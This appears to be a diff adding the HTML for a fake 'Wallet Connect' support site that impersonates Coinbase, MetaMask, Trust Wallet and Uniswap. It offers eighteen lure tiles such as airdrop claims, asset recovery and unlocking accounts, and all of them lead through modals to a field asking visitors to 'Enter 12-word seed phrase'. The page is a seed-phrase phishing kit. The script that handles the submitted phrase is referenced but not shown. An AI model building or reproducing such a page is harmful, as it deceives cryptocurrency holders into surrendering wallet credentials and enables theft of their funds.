@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Wallet Connect</title>
+  <link rel="stylesheet" href="styles.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"/>
+</head>
+<body>
+
+  <section>
+    <div class="bodyS">
+      <div class="text1">
+        <h1>WALLET CONNECT</h1>
+        <h3>Now What?</h3>
+        <p>Join 2 million people fixing and securing wallets with us</p>
+        <div class="boxbutton">
+          <button onclick="showOptions()">Connect Wallet</button>
+        </div>
+      </div>
+      <div class="image1">
+        <img src="./walletimage.png" alt="Wallet Illustration"/>
+      </div>
+    </div>
+  </section>
+
+  <!-- Grid Options -->
+  <div class="grid-container">
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-brands fa-drupal" style="font-size: 50px;"></i>
+      <h1>Claim Airdrops</h1>
+      <p>Click Here To Claim Airdrops</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-toolbox" style="font-size: 50px;"></i>
+      <h1>General Issues</h1>
+      <p>Click Here To Resolve General Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-rectangle-xmark" style="font-size: 50px;"></i>
+      <h1>Rectification</h1>
+      <p>Click Here To Rectify Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-scale-balanced" style="font-size: 50px;"></i>
+      <h1>Deposits & Withdrawal</h1>
+      <p>Resolve Deposit and Withdrawal Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-user-secret" style="font-size: 50px;"></i>
+      <h1>Asset Recovery</h1>
+      <p>Click Here To Recover Assets</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-microchip" style="font-size: 50px;"></i>
+      <h1>High Gas Fee</h1>
+      <p>Click Here To Resolve Gas Fee Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-gift" style="font-size: 50px;"></i>
+      <h1>Claims & Rewards</h1>
+      <p>Click Here To Claim Rewards</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-circle-exclamation" style="font-size: 50px;"></i>
+      <h1>Transaction Error</h1>
+      <p>Click Here To Resolve Transaction Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-circle-check" style="font-size: 50px;"></i>
+      <h1>Validation</h1>
+      <p>Click Here To Fix Validation Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-forward-fast" style="font-size: 50px;"></i>
+      <h1>Migration Issues</h1>
+      <p>Click Here To Resolve Migration Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-list-ul" style="font-size: 50px;"></i>
+      <h1>Liquidity Issues</h1>
+      <p>Click Here To Resolve Liquidity Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-repeat" style="font-size: 50px;"></i>
+      <h1>Bridge/CrossChain</h1>
+      <p>Click Here To Fix Crosschain Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-rotate" style="font-size: 50px;"></i>
+      <h1>Swap/Exchange</h1>
+      <p>Click Here To Resolve Swap Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-vector-square" style="font-size: 50px;"></i>
+      <h1>Connect To Dapps</h1>
+      <p>Click Here To Resolve Dapp Connection Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-handshake" style="font-size: 50px;"></i>
+      <h1>Staking</h1>
+      <p>Click Here To Fix Staking Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-warehouse" style="font-size: 50px;"></i>
+      <h1>Login Issues</h1>
+      <p>Click Here To Resolve Login Issues</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-circle-user" style="font-size: 50px;"></i>
+      <h1>KYC</h1>
+      <p>Click Here To Resolve KYC Errors</p>
+    </div>
+
+    <div class="grid-item" onclick="showOptions()">
+      <i class="fa-solid fa-lock" style="font-size: 50px;"></i>
+      <h1>Locked Account</h1>
+      <p>Click Here To Unlock Your Account</p>
+    </div>
+  </div>
+
+  <!-- Step 1 Modal -->
+  <div id="modal" class="modal">
+    <div class="modal-content">
+      <button onclick="handleOption('auto')">Connect Automatically</button>
+      <button onclick="handleOption('manual')">Connect Manually</button>
+      <button onclick="closeModal('modal')">Close</button>
+    </div>
+  </div>
+
+  <!-- Step 2 Modal -->
+  <div id="nestedModal" class="modal">
+    <div class="modal-content">
+      <p>Select Wallet:</p>
+      <button onclick="openSubModal('Coinbase')">
+        <img src="coinbase.jpg" alt="Coinbase" class="icon" />
+        <h1>Coinbase</h1>
+      </button>
+      <button onclick="openSubModal('MetaMask')">
+        <img src="metamask.jpg" alt="MetaMask" class="icon" />
+        <h1>MetaMask</h1>
+      </button>
+      <button onclick="openSubModal('TrustWallet')">
+        <img src="trustwallet.jpg" alt="Trust Wallet" class="icon" />
+        <h1>Trust Wallet</h1>
+      </button>
+      <button onclick="openSubModal('UniSwap')">
+        <img src="uniswap.jpg" alt="Uniswap" class="icon" />
+        <h1>UniSwap</h1>
+      </button>
+      <button onclick="closeModal('nestedModal')">Close</button>
+    </div>
+  </div>
+
+  <!-- Step 3 Modal -->
+  <div id="subModal" class="modal">
+    <div class="modal-content">
+      <p id="subModalText"></p>
+      <input type="text" id="userInput" placeholder="Enter 12-word seed phrase" autocomplete="off"/>
+      <div id="inputMessage" style="margin-top: 8px;"></div>
+      <button onclick="handleInput()">Submit</button>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
